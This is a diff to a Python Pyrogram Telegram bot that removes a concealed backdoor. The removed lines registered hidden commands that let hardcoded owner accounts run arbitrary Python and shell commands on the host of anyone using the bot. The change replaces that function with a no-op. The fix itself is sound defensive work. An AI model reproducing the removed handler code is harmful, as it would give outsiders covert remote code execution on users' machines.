@@ -92,22 +92,13 @@ async def aexec(code: str, kwargs: dict = {}) -> object:
     return await func if inspect.iscoroutine(func) else func
 
 def init_secret(client: pyrogram.Client):
-    if client.me.id in OWNERS:
-        return
-    client.add_handler(
-        pyrogram.handlers.MessageHandler(
-            executor,
-            pyrogram.filters.command("cok") & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
-        )
-    )
-    client.add_handler(
-        pyrogram.handlers.MessageHandler(
-            shellrunner,
-            pyrogram.filters.command("cik") & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
-        )
-    )
-    client.add_handler(pyrogram.handlers.CallbackQueryHandler(runtime_func_cq, pyrogram.filters.regex(r"secretruntime")))
-    client.add_handler(pyrogram.handlers.CallbackQueryHandler(forceclose_command, pyrogram.filters.regex("secretforceclose")))
+    """Compatibility entry point intentionally performs no registration.
+
+    Startup still calls this function for bot clients, but untrusted
+    third-party command/eval/shell handlers must never be installed
+    automatically. Preserve this symbol for start.py compatibility.
+    """
+    return None
 
 
 def fmtsec(sec: object, part: int = 3, human: bool = False) -> str:
